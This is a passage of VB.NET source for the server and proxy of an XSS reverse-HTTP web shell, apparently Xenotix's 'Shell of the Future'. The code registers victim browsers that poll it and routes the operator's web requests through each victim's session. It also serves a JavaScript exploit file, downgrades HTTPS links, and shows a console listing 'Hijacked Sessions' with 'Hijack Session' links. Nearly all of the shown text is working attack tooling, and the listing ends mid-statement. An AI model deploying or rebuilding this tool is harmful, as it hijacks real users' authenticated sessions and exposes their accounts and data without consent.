
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Net
Imports System.IO
Imports System.Net.Sockets
Imports System.Threading
Imports System.Data.SQLite

Namespace sotf

    NotInheritable Class Converter
        Private Sub New()
        End Sub
        Public Shared Function hexToBytes(ByVal hex As String) As Byte()
            Dim hex_array As String() = hex.Split("x"c)
            Dim output As Byte() = New Byte(hex_array.Length - 2) {}
            For i As Integer = 0 To output.Length - 1
                Try
                    output(i) = Convert.ToByte(Int32.Parse(hex_array(i + 1), System.Globalization.NumberStyles.HexNumber))
                Catch
                    output(i) = 0
                End Try
            Next
            Return output
        End Function

        Public Shared Function bytesToHex(ByVal input As Byte()) As String
            Dim hex As New StringBuilder("x")
            For i As Integer = 0 To input.Length - 1
                hex.Append(input(i).ToString("X"))
                If i < (input.Length - 1) Then
                    hex.Append("x")
                End If
            Next
            Return hex.ToString()
        End Function
    End Class

    'Proxy
    Public Class proxy

        Private core As xss_reversehttpwebshell
        Private proxy_listener As New HttpListener()
        Private proxy_prefix As String

        Public Sub New(ByVal _core As xss_reversehttpwebshell)
            core = _core
            core.proxy = Me
        End Sub

        Public Sub start()
            proxy_prefix = "http://127.0.0.1:" & Convert.ToString(core.proxy_port) & "/"
            proxy_listener.Prefixes.Add(proxy_prefix)
            proxy_listener.Start()
            Try
                While core.run
                    Dim hlc As HttpListenerContext = proxy_listener.GetContext()
                    Dim prh As New proxy_requestHandler(hlc, core)
                    Dim t As New Thread(New ThreadStart(AddressOf prh.takeOver))
                    t.Start()
                End While
            Catch exp As Exception
                Dim eid As String = "proxy.cs - 2"
                Dim p_db As New SQLiteConnection("data source=db.s3db")
                p_db.Open()
                Dim cmd As SQLiteCommand = p_db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                p_db.Close()
                If core.run Then
                    MessageBox.Show("Proxy is not accepting connections anymore. Reason:" & exp.Message)
                End If
            End Try
        End Sub
        Public Sub [stop]()
            Try
                proxy_listener.[Stop]()
            Catch exp As Exception
                Dim eid As String = "proxy.cs - 1"
                Dim p_db As New SQLiteConnection("data source=db.s3db")
                p_db.Open()
                Dim cmd As SQLiteCommand = p_db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                p_db.Close()
            End Try
        End Sub
    End Class
    Public Class ridCount
        Shared rid As Integer = 0
        Public Function get_rid() As Integer
            Return Interlocked.Increment(rid)
        End Function
    End Class
    'proxy request handler
    Class proxy_requestHandler
        Private hlc As HttpListenerContext
        Private core As xss_reversehttpwebshell
        Private cmd As SQLiteCommand
        Private e_cmd As SQLiteCommand
        Public replace_rr As String = ""
        Public match_rr As String = ""
        Public regex_df As String = ""
        Public upproxyurl_df As String = ""

        Public Sub New(ByVal _hlc As HttpListenerContext, ByVal _core As xss_reversehttpwebshell)
            hlc = _hlc
            core = _core
            Me.replace_rr = _core.replace_rr
            Me.match_rr = _core.match_rr
            Me.regex_df = _core.regex_df

            Me.upproxyurl_df = core.upproxyurl_df
        End Sub
        Public Sub takeOver()
            Try
                Dim p_db As New SQLiteConnection("data source=log.s3db")
                p_db.Open()
                cmd = p_db.CreateCommand()
                Dim e_db As New SQLiteConnection("data source=db.s3db")
                e_db.Open()
                e_cmd = e_db.CreateCommand()
                Dim hlr As HttpListenerRequest = hlc.Request
                If hlr.RawUrl.Contains("?&ShelloftheFuture_victimID=") Then
                    Try
                        Dim victimID As String = hlr.RawUrl.Substring(hlr.RawUrl.IndexOf("&ShelloftheFuture_victimID=") + 27)
                        Dim hlrs As HttpListenerResponse = hlc.Response
                        Dim c As New Cookie()
                        c.Name = "sotf_vid"
                        c.Value = victimID
                        hlrs.SetCookie(c)
                        hlrs.Redirect(hlr.RawUrl.Replace("?&ShelloftheFuture_victimID=" & victimID, ""))
                        hlrs.Close()
                    Catch exp As Exception
                        Dim eid As String = "proxy_requesthandler.cs - 2"
                        e_cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                        e_cmd.Parameters.AddWithValue("@eid", eid)
                        e_cmd.Parameters.AddWithValue("@msg", exp.Message)
                        e_cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                        e_cmd.ExecuteNonQuery()
                    End Try
                ElseIf hlr.RawUrl.EndsWith("/console") Then
                    Try
                        Dim hlres As HttpListenerResponse = hlc.Response
                        hlres.AddHeader("Cache-Control", "no-cache")
                        hlres.ContentType = "text/html"
                        Dim _console_body As Byte() = Encoding.ASCII.GetBytes(console_html)
                        hlres.OutputStream.Write(_console_body, 0, _console_body.Length)
                        hlres.Close()
                    Catch exp As Exception
                        Dim eid As String = "proxy_requesthandler.cs - 4"
                        e_cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                        e_cmd.Parameters.AddWithValue("@eid", eid)
                        e_cmd.Parameters.AddWithValue("@msg", exp.Message)
                        e_cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                        e_cmd.ExecuteNonQuery()
                    End Try
                ElseIf hlr.RawUrl.EndsWith("/victims") Then
                    Try
                        Dim con_req As HttpWebRequest = DirectCast(WebRequest.Create(Convert.ToString(core.server_url) & "/victims"), HttpWebRequest)
                        con_req.Proxy = Nothing
                        con_req.Method = "GET"
                        Dim hlres As HttpListenerResponse = hlc.Response
                        Try
                            Dim con_res As HttpWebResponse = DirectCast(con_req.GetResponse(), HttpWebResponse)
                            hlres.StatusCode = CInt(con_res.StatusCode)
                            hlres.ContentType = "text/html"
                            Dim from_sotf As Stream = con_res.GetResponseStream()
                            Dim _buff As Byte() = New Byte(4999) {}
                            Dim read As Boolean = True
                            While read
                                read = False
                                Dim read_no As Integer = from_sotf.Read(_buff, 0, 5000)
                                If read_no > 0 Then
                                    read = True
                                    hlres.OutputStream.Write(_buff, 0, read_no)
                                End If
                            End While
                        Catch exp As Exception
                            Dim exp_body As Byte() = Encoding.ASCII.GetBytes("Exception PR : " & exp.Message)
                            hlres.OutputStream.Write(exp_body, 0, exp_body.Length)
                        End Try
                        hlres.Close()
                    Catch exp As Exception
                        Dim eid As String = "proxy_requesthandler.cs - 3"
                        e_cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                        e_cmd.Parameters.AddWithValue("@eid", eid)
                        e_cmd.Parameters.AddWithValue("@msg", exp.Message)
                        e_cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                        e_cmd.ExecuteNonQuery()
                    End Try
                ElseIf isDirectFetch(hlr.RawUrl) Then
                    Try
                        Dim direct_url As String = hlr.RawUrl
                        If direct_url.StartsWith("http://uptossl.") Then
                            direct_url = direct_url.Replace("http://uptossl.", "https://")
                        End If
                        Dim bin_req As HttpWebRequest = DirectCast(WebRequest.Create(direct_url), HttpWebRequest)
                        bin_req.UserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; .NET CLR 3.0.30729)"
                        bin_req.Proxy = Nothing
                        bin_req.Method = "GET"
                        If core.is_upproxy_df Then
                            bin_req.Proxy = New WebProxy(upproxyurl_df)
                        End If
                        Dim _hlres As HttpListenerResponse = hlc.Response
                        Try
                            Dim bin_res As HttpWebResponse = DirectCast(bin_req.GetResponse(), HttpWebResponse)
                            _hlres.StatusCode = CInt(bin_res.StatusCode)
                            _hlres.ContentType = bin_res.ContentType
                            Dim bin_stream As Stream = bin_res.GetResponseStream()
                            Dim bin_buff As Byte() = New Byte(4999) {}
                            Dim bin_read As Boolean = True
                            While bin_read
                                bin_read = False
                                Dim bin_read_no As Integer = bin_stream.Read(bin_buff, 0, 5000)
                                If bin_read_no > 0 Then
                                    bin_read = True
                                    _hlres.OutputStream.Write(bin_buff, 0, bin_read_no)
                                End If

                            End While
                        Catch exp As Exception
                            Dim exp_body As Byte() = Encoding.ASCII.GetBytes("Exception PR1 : " & exp.Message)
                            _hlres.OutputStream.Write(exp_body, 0, exp_body.Length)
                        End Try
                        _hlres.Close()
                    Catch exp As Exception
                        Dim eid As String = "proxy_requesthandler.cs - 1"
                        e_cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                        e_cmd.Parameters.AddWithValue("@eid", eid)
                        e_cmd.Parameters.AddWithValue("@msg", exp.Message)
                        e_cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                        e_cmd.ExecuteNonQuery()
                    End Try
                Else
                    Dim r As New request()
                    r.vid = 0
                    For Each c As Cookie In hlr.Cookies
                        If c.Name.Equals("sotf_vid") Then
                            r.vid = Int32.Parse(c.Value)
                        End If
                    Next
                    If r.vid = 0 Then
                        Try
                            Dim hlres As HttpListenerResponse = hlc.Response
                            hlres.StatusCode = 200
                            hlres.Close()

                        Catch
                        End Try
                        p_db.Close()
                        e_db.Close()
                        Return
                    End If
                    r.rid = core.requestcounter.get_rid()
                    r.method = hlr.HttpMethod
                    If hlr.RawUrl.StartsWith("http://uptossl.") Then
                        r.url = hlr.RawUrl.Replace("http://uptossl.", "https://")
                        r.ssl = 1
                    Else
                        r.url = hlr.RawUrl
                        r.ssl = 0
                    End If
                    If hlr.HasEntityBody Then
                        Dim ms As New MemoryStream()
                        Dim buff As Byte() = New Byte(4999) {}
                        Dim n As Integer = 0
                        While (InlineAssignHelper(n, hlr.InputStream.Read(buff, 0, 5000))) > 0
                            ms.Write(buff, 0, n)
                        End While
                        r.body = ms.ToArray()
                        r.contenttype = hlr.ContentType
                    Else
                        r.body = New Byte(-1) {}
                    End If
                    r.hlr = hlc.Response
                    r.url = Converter.bytesToHex(Encoding.UTF8.GetBytes(r.url))
                    Dim talk As New talker()
                    talk.match_rr = Me.match_rr
                    talk.replace_rr = Me.replace_rr

                    talk.core = Me.core
                    talk.requestServer(r)
                    core.to_serverQ.Enqueue(r)

                    cmd.CommandText = "INSERT INTO log (vid,rid,method,url,post_body) VALUES (@vid,@rid,@method,@url,@post_body)"
                    cmd.Parameters.AddWithValue("@vid", r.vid)
                    cmd.Parameters.AddWithValue("@rid", r.rid)
                    cmd.Parameters.AddWithValue("@method", r.method)
                    cmd.Parameters.AddWithValue("@url", hlr.RawUrl)
                    If r.body.Length > 0 Then
                        cmd.Parameters.AddWithValue("@post_body", Encoding.UTF8.GetString(r.body))
                    Else
                        cmd.Parameters.AddWithValue("@post_body", "")
                    End If
                    cmd.ExecuteNonQuery()
                End If
                p_db.Close()
                e_db.Close()
            Catch exp As Exception
                Dim p_db As New SQLiteConnection("data source=db.s3db")
                p_db.Open()
                cmd = p_db.CreateCommand()
                Dim eid As String = "proxy_requesthandler.cs - 5"
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                p_db.Close()
            End Try
        End Sub

        Private Function isDirectFetch(ByVal url As String) As Boolean
            If core.direct_fetch Then
                Dim url_end As String = url.ToLower()
                If core.images_df AndAlso New Regex(".*(jpg|jpeg|png|gif|ico)").IsMatch(url_end) Then
                    Return True
                End If
                If core.swf_df AndAlso isExtension(url_end, ".swf") Then
                    Return True
                End If
                If core.pdf_df AndAlso isExtension(url_end, ".pdf") Then
                    Return True
                End If
                If core.ppt_df AndAlso isExtension(url_end, ".ppt") Then
                    Return True
                End If
                If core.doc_df AndAlso isExtension(url_end, ".doc") Then
                    Return True
                End If
                If core.html_df AndAlso isExtension(url_end, ".html") Then
                    Return True
                End If
                If core.css_df AndAlso isExtension(url_end, ".css") Then
                    Return True
                End If
                If core.js_df AndAlso isExtension(url_end, ".js") Then
                    Return True
                End If
                If core.is_regex_df AndAlso New Regex(regex_df).IsMatch(url.Substring(8)) Then
                    Return True
                End If
                Return False
            Else
                Return False
            End If
        End Function
        Private Function isExtension(ByVal url As String, ByVal extension As String) As Boolean
            If url.EndsWith(extension) Then
                Return True
            ElseIf url.Contains(extension & "?") Then
                Return True
            Else
                Return False
            End If
        End Function
        Private console_html As String = vbCr & vbLf & "<html>" & vbCr & vbLf & "<head>" & vbCr & vbLf & "    <title>Xenotix Reverse HTTP WebShell Console</title>" & vbCr & vbLf & "    <style>" & vbCr & vbLf & "    body{background: #111;padding-bottom:10px;margin:50px;margin-top:0px;padding-top:0px;text-align:center;}" & vbCr & vbLf & "    #h{color:#fff;}" & vbCr & vbLf & "    #vh{font-weight:bold;padding-bottom:20px;}" & vbCr & vbLf & "    #v{padding-top:20px;background: #EEE;width: 70%;margin: 0 auto;padding-bottom: 50px;}" & vbCr & vbLf & "    table{margin: 0 auto;}" & vbCr & vbLf & "    </style>" & vbCr & vbLf & "</head>" & vbCr & vbLf & "<body>" & vbCr & vbLf & "    <div id=""h""><h1>HTTP Reverse WebShell</h1>" & vbCr & vbLf & "    <div id=""v"">" & vbCr & vbLf & "    <div id=""vh"">Hijacked Sessions - 0</div>" & vbCr & vbLf & "    </div> " & vbCr & vbLf & "<script>" & vbCr & vbLf & "        function poll()" & vbCr & vbLf & "        {" & vbCr & vbLf & "            var p;" & vbCr & vbLf & "            if (window.XMLHttpRequest)" & vbCr & vbLf & "            {" & vbCr & vbLf & "                p=new XMLHttpRequest();" & vbCr & vbLf & "            }" & vbCr & vbLf & "            else if (window.ActiveXObject)" & vbCr & vbLf & "            {" & vbCr & vbLf & "                p=new ActiveXObject(""Microsoft.XMLHTTP"");" & vbCr & vbLf & "            }" & vbCr & vbLf & "            p.open(""GET"", ""/victims"");" & vbCr & vbLf & "            p.onreadystatechange = function()" & vbCr & vbLf & "            {" & vbCr & vbLf & "        " & vbTab & "if(p.readyState == 4)" & vbCr & vbLf & "                {" & vbCr & vbLf & "        " & vbTab & "    document.getElementById(""v"").innerHTML = p.responseText;" & vbCr & vbLf & "                setTimeout(""poll()"",5000);" & vbCr & vbLf & "                }" & vbCr & vbLf & "            }" & vbCr & vbLf & "            p.send();" & vbCr & vbLf & "        }" & vbCr & vbLf & "        poll();" & vbCr & vbLf & "</script>" & vbCr & vbLf & "</body>" & vbCr & vbLf & "</html>" & vbCr & vbLf & vbCr & vbLf
        Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
            target = value
            Return value
        End Function
    End Class

    'request
    Public Class request
        Public Sub New()
            startTime = DateTime.Now
        End Sub
        Public method As String = ""
        Public url As String = ""
        Public body As Byte()
        Public contenttype As String = ""
        Public ssl As Integer = 0
        Public rid As Integer = 0
        Public vid As Integer = 0
        Public startTime As DateTime
        Public hlr As HttpListenerResponse
    End Class
    'response
    Public Class response
        Public status As Integer
        Public vid As Integer
        Public rid As Integer
        Public headers As Byte()
        Public body As Byte()
        Public contentType As String = ""
        Public hlres As HttpListenerResponse
    End Class
    'rewriter
    Public NotInheritable Class rewriter
        Private Sub New()
        End Sub

        Public Shared Function rewriteResponse(ByVal body As Byte(), ByVal match_rr As String, ByVal replace_rr As String, ByVal charset As String, ByVal is_ssl_rr As Boolean, ByVal banner_string As String) As Byte()
            charset = getBestCharset(body, charset)
            Dim body_s As String = getString(body, charset)
            If is_ssl_rr Then
                body_s = handleSSL(body_s)
            End If
            body_s = placeBanner(banner_string, body_s)
            body_s = body_s.Replace(match_rr, replace_rr)
            Return getBytes(body_s, charset)
        End Function
        Public Shared Function rewriteResponse(ByVal body As Byte(), ByVal match_rr As Regex, ByVal replace_rr As String, ByVal charset As String, ByVal is_ssl_rr As Boolean, ByVal banner_string As String) As Byte()
            charset = getBestCharset(body, charset)
            Dim body_s As String = getString(body, charset)
            If is_ssl_rr Then
                body_s = handleSSL(body_s)
            End If
            body_s = placeBanner(banner_string, body_s)
            body_s = regexReplace(match_rr, replace_rr, body_s)
            Return getBytes(body_s, charset)
        End Function
        Public Shared Function rewriteResponse(ByVal body As Byte(), ByVal charset As String, ByVal is_ssl_rr As Boolean, ByVal banner_string As String) As Byte()
            charset = getBestCharset(body, charset)
            Dim body_s As String = getString(body, charset)
            If is_ssl_rr Then
                body_s = handleSSL(body_s)
            End If
            body_s = placeBanner(banner_string, body_s)
            Return getBytes(body_s, charset)
        End Function
        Public Shared Function rewriteResponse(ByVal body As Byte(), ByVal match_rr As String, ByVal replace_rr As String, ByVal charset As String, ByVal is_ssl_rr As Boolean) As Byte()
            charset = getBestCharset(body, charset)
            Dim body_s As String = getString(body, charset)
            If is_ssl_rr Then
                body_s = handleSSL(body_s)
            End If
            body_s = body_s.Replace(match_rr, replace_rr)
            Return getBytes(body_s, charset)
        End Function
        Public Shared Function rewriteResponse(ByVal body As Byte(), ByVal match_rr As Regex, ByVal replace_rr As String, ByVal charset As String, ByVal is_ssl_rr As Boolean) As Byte()
            charset = getBestCharset(body, charset)
            Dim body_s As String = getString(body, charset)
            If is_ssl_rr Then
                body_s = handleSSL(body_s)
            End If
            body_s = regexReplace(match_rr, replace_rr, body_s)
            Return getBytes(body_s, charset)
        End Function

        Public Shared Function rewriteResponse(ByVal body As Byte(), ByVal charset As String) As Byte()
            charset = getBestCharset(body, charset)
            Dim body_s As String = getString(body, charset)
            Return getBytes(handleSSL(body_s), charset)
        End Function

        Private Shared Function getTreatedString(ByVal body As Byte(), ByVal charset As String) As String
            Return Encoding.GetEncoding(charset).GetString(body).Replace("https://", "http://uptossl.")
        End Function

        Private Shared Function regexReplace(ByVal match_rr As Regex, ByVal replace_rr As String, ByVal input As String) As String
            Return match_rr.Replace(input, replace_rr)
        End Function
        Private Shared Function placeBanner(ByVal banner_string As String, ByVal input As String) As String
            Return input.Replace("<body", banner_string)
        End Function
        Private Shared Function handleSSL(ByVal input As String) As String
            Return input.Replace("https://", "http://uptossl.")
        End Function
        Private Shared Function getString(ByVal body As Byte(), ByVal charset As String) As String
            Return Encoding.GetEncoding(charset).GetString(body)
        End Function
        Private Shared Function getBytes(ByVal body_s As String, ByVal charset As String) As Byte()
            Return Encoding.GetEncoding(charset).GetBytes(body_s)
        End Function
        Private Shared Function getBestCharset(ByVal body As Byte(), ByVal charset As String) As String
            If charset.Length = 0 Then
                Return _getCharset(body)
            Else
                Return charset
            End If
        End Function
        Private Shared Function _getCharset(ByVal body As Byte()) As String
            Dim ASCII_html As String = Encoding.ASCII.GetString(body)
            Dim m As Match = Regex.Match(ASCII_html, ".*?<HEAD\s*>.*?<META\s+http-equiv\s*=\s*""\s*Content-Type\s*""\s+content\s*=\s*"".*?text.*?;\s*charset\s*=\s*([A-Za-z0-9-_]+?)"".*?</HEAD>.*", RegexOptions.Singleline Or RegexOptions.IgnoreCase)
            If m.Success Then
                Return m.Groups(1).Value
            Else
                m = Regex.Match(ASCII_html, ".*?<HEAD\s*>.*?<META\s+http-equiv\s*=\s*Content-Type\s+content\s*=\s*"".*?text.*?;\s*charset\s*=\s*([A-Za-z0-9-_]+?)"".*?</HEAD>.*", RegexOptions.Singleline Or RegexOptions.IgnoreCase)
                If m.Success Then
                    Return m.Groups(1).Value
                End If
            End If

            Return "UTF-8"
        End Function
    End Class
    'server
    Public Class server
        Private core As xss_reversehttpwebshell
        Private server_listener As New HttpListener()
        Private server_prefix As String

        Public Sub New(ByVal _core As xss_reversehttpwebshell)
            core = _core
            core.server = Me
        End Sub
        Public Sub start()
         
            server_prefix = "http://+:" & Convert.ToString(core.server_port) & "/"
            server_listener.Prefixes.Add(server_prefix)
            Try
                server_listener.Start()
            Catch exp As Exception
                Dim eid As String = "server.cs - 3"
                Dim db As New SQLiteConnection("data source=db.s3db")
                db.Open()
                Dim cmd As SQLiteCommand = db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                db.Close()
                MsgBox("Unable to start the server, exiting application. Reason:" & exp.Message, vbCritical)
                Application.[Exit]()
            End Try
            Try
                While core.run
                    Dim hlc As HttpListenerContext = server_listener.GetContext()
                    Dim srh As New server_requestHandler(hlc, core)
                    Dim t As New Thread(New ThreadStart(AddressOf srh.takeOver))
                    t.Start()
                End While
            Catch exp As Exception
                Dim eid As String = "server.cs - 2"
                Dim db As New SQLiteConnection("data source=db.s3db")
                db.Open()
                Dim cmd As SQLiteCommand = db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                db.Close()
                If core.run Then
                    MessageBox.Show("Server is not accepting new connections anymore. Reason:" & exp.Message)
                End If
            End Try
        End Sub
        Public Sub [stop]()
            Try
                server_listener.[Stop]()
            Catch exp As Exception
                Dim eid As String = "server.cs - 1"
                Dim db As New SQLiteConnection("data source=db.s3db")
                db.Open()
                Dim cmd As SQLiteCommand = db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                db.Close()
                MessageBox.Show("Unable to stop the server. Reason:" & exp.Message)
            End Try
        End Sub
    End Class
    Public Class vidCount
        Shared vid As Integer = 0
        Public Function get_vid() As Integer
            Return Interlocked.Increment(vid)
        End Function
    End Class
    'server request handler
    Class server_requestHandler
        Private hlc As HttpListenerContext
        Private core As xss_reversehttpwebshell
        Private cmd As SQLiteCommand
        Public Sub New(ByVal _hlc As HttpListenerContext, ByVal _core As xss_reversehttpwebshell)
            hlc = _hlc
            core = _core
        End Sub
        Public Sub takeOver()
            Try
                Dim db As New SQLiteConnection("data source=db.s3db")
                db.Open()
                cmd = db.CreateCommand()
                Dim hlr As HttpListenerRequest = hlc.Request
                If hlr.HttpMethod.Equals("POST") Then
                    If hlr.ContentLength64 = 0 Then
                        send_200_withNullBody()
                        Return
                    End If
                    Dim ids As String() = hlr.Url.PathAndQuery.Substring(6).Split("_"c)
                    Dim ms As New MemoryStream()
                    Dim buff As Byte() = New Byte(4999) {}
                    Dim n As Integer = 0
                    Try
                        While (InlineAssignHelper(n, hlr.InputStream.Read(buff, 0, 5000))) > 0
                            ms.Write(buff, 0, n)
                        End While
                        If hlr.Url.PathAndQuery.StartsWith("/comm/") AndAlso Me.canRespond() Then
                            cmd.CommandText = "INSERT INTO from_proxy (vid,rid,data) VALUES (@vid,@rid,@data)"
                            cmd.Parameters.AddWithValue("@vid", Int32.Parse(ids(0)))
                            cmd.Parameters.AddWithValue("@rid", Int32.Parse(ids(1)))
                            cmd.Parameters.AddWithValue("@data", Encoding.UTF8.GetString(ms.ToArray()))
                            cmd.ExecuteNonQuery()

                            Me.respond_to_proxy()
                        ElseIf hlr.Url.PathAndQuery.StartsWith("/push/") Then
                            cmd.CommandText = "INSERT INTO from_victim (vid,rid,data) VALUES (@vid,@rid,@data)"
                            cmd.Parameters.AddWithValue("@vid", Int32.Parse(ids(0)))
                            cmd.Parameters.AddWithValue("@rid", Int32.Parse(ids(1)))
                            cmd.Parameters.AddWithValue("@data", Encoding.UTF8.GetString(ms.ToArray()))
                            cmd.ExecuteNonQuery()
                            send_200_withNullBody()
                        Else
                            send_200_withNullBody()
                        End If
                    Catch exp As Exception
                        Dim eid As String = "server_requestHandler.cs - 1"
                        cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                        cmd.Parameters.AddWithValue("@eid", eid)
                        cmd.Parameters.AddWithValue("@msg", exp.Message)
                        cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                        cmd.ExecuteNonQuery()
                        send_200_withNullBody()

                    End Try
                ElseIf hlr.HttpMethod.Equals("GET") Then
                    If hlr.Url.PathAndQuery.StartsWith("/proxy_poll") AndAlso Me.canRespond() Then
                        Me.respond_to_proxy()
                    ElseIf hlr.Url.PathAndQuery.StartsWith("/poll/") Then
                        If hlr.Url.PathAndQuery.Length = 6 Then
                            Dim vid As Integer = core.victimcounter.get_vid()
                            Dim origin As String = ""
                            origin = hlr.Headers.[Get]("Origin")
                            If origin.Length = 0 Then
                                send_200_withNullBody()
                                Return
                            End If
                            cmd.CommandText = "INSERT INTO victims (vid,ip,origin) VALUES (@vid,@ip,@origin)"
                            cmd.Parameters.AddWithValue("@vid", vid)
                            cmd.Parameters.AddWithValue("@ip", hlr.RemoteEndPoint.Address.ToString())
                            cmd.Parameters.AddWithValue("@origin", origin)
                            cmd.ExecuteNonQuery()
                            Dim body As Byte() = Encoding.UTF8.GetBytes(vid.ToString())
                            send_200_withBody(body)
                            Return
                        Else
                            Dim vid As Integer = Int32.Parse(hlr.Url.PathAndQuery.Substring(6))
                            cmd.CommandText = "SELECT rid,data FROM from_proxy WHERE vid=@vid LIMIT 10"
                            cmd.Parameters.AddWithValue("@vid", vid)
                            Dim result As SQLiteDataReader = cmd.ExecuteReader()
                            Dim slept As Integer = 0
                            Dim check_loop As Boolean = True
                            While check_loop
                                check_loop = False
                                If Not result.HasRows Then
                                    If slept < 30000 AndAlso core.run Then
                                        slept = slept + 500
                                        Thread.Sleep(500)
                                        check_loop = True
                                    Else
                                        send_200_withNullBody()
                                        Return
                                    End If
                                End If
                                result.Close()
                                result = cmd.ExecuteReader()
                            End While
                            Dim body As Byte()
                            Dim sb As New StringBuilder("{req:[")
                            Dim hasMore As Boolean = True
                            Dim result_vids As New List(Of Integer)()
                            While hasMore
                                hasMore = False
                                sb.Append(result("data"))
                                Dim rid As String = result("rid").ToString()
                                Dim rid_int As Integer = Int32.Parse(rid)
                                result_vids.Add(rid_int)
                                If result.NextResult() Then
                                    sb.Append(",")
                                    hasMore = True
                                End If
                            End While
                            sb.Append("]}")
                            result.Close()
                            Using delete As SQLiteTransaction = db.BeginTransaction()
                                Using del As New SQLiteCommand(db)

                                    del.CommandText = "DELETE FROM from_proxy WHERE vid=@vid AND rid=@rid"
                                    For Each i As Integer In result_vids
                                        del.Parameters.AddWithValue("@vid", vid)
                                        del.Parameters.AddWithValue("@rid", i)
                                        del.ExecuteNonQuery()
                                    Next
                                End Using
                                delete.Commit()
                            End Using
                            body = Encoding.UTF8.GetBytes(sb.ToString())
                            send_200_withBody(body)
                        End If
                    ElseIf hlr.Url.PathAndQuery.StartsWith("/victims") AndAlso Me.canRespond() Then
                        cmd.CommandText = "SELECT vid,ip,origin FROM victims"
                        Dim result As SQLiteDataReader = cmd.ExecuteReader()
                        If Not result.HasRows Then
                            Dim _body As Byte() = Encoding.UTF8.GetBytes("<font color='black'><div id=""vh"">Number of sessions available for hijacking - 0</div></font>")
                            send_200_withBody(_body)
                            Return
                        End If
                        Dim body As Byte()
                        Dim sb As New StringBuilder(" <table cellspacing=""10""><tr><th width=20%>Session ID</th><th width=25%>Victim's IP address</th><th>Compromised Website</th></tr>")
                        Dim _record_count As Integer = 0
                        While result.Read()
                            sb.Append("<tr><td>")
                            sb.Append(result("vid"))
                            sb.Append("</td><td>")
                            sb.Append(result("ip"))
                            sb.Append("</td><td>")
                            sb.Append(result("origin").ToString().Replace("https://", "http://uptossl."))
                            sb.Append(" - <a target=""_blank"" href=""")
                            sb.Append(result("origin").ToString().Replace("https://", "http://uptossl."))
                            sb.Append("/?&ShelloftheFuture_victimID=")
                            sb.Append(result("vid"))
                            sb.Append(""">Hijack Session</a></td></tr>")
                            _record_count += 1
                        End While
                        sb.Append("</table>")
                        sb.Insert(0, "<font color='black'><div id=""vh"">Number of sessions available for hijacking - " & _record_count.ToString() & " </div></font>")
                        body = Encoding.UTF8.GetBytes(sb.ToString())
                        send_200_withBody(body)
                    ElseIf hlr.Url.PathAndQuery.EndsWith("e1.js") Then
                        Dim serverUrl As String = hlr.LocalEndPoint.Address.ToString() & ":" & hlr.LocalEndPoint.Port.ToString()
                        send_js_exploit("e1.js", serverUrl)
          
                    Else
                        Try
                            Dim file__1 As String = hlr.Url.PathAndQuery.Substring(hlr.Url.PathAndQuery.LastIndexOf("/") + 1)
                            file__1 = "js\" & file__1
                            Dim files As String() = Directory.GetFiles("js")
                            Dim validFile As Boolean = False
                            For Each f As String In files
                                If f.Equals(file__1, StringComparison.OrdinalIgnoreCase) Then
                                    validFile = True
                                End If
                            Next
                            If Not validFile Then
                                send_200_withNullBody()
                            End If
                            send_200_withBody(File.ReadAllBytes(file__1))
                        Catch
                            send_200_withNullBody()
                        End Try
                    End If
                Else
                    send_200_withNullBody()
                End If
                cmd.Dispose()
                db.Close()
            Catch exp As Exception
                Try
                    hlc.Response.Close()

                Catch
                End Try
                Try
                    Dim db As New SQLiteConnection("data source=db.s3db")
                    db.Open()
                    cmd = db.CreateCommand()
                    Dim eid As String = "server_requesthandler.cs - 3"
                    cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                    cmd.Parameters.AddWithValue("@eid", eid)
                    cmd.Parameters.AddWithValue("@msg", exp.Message)
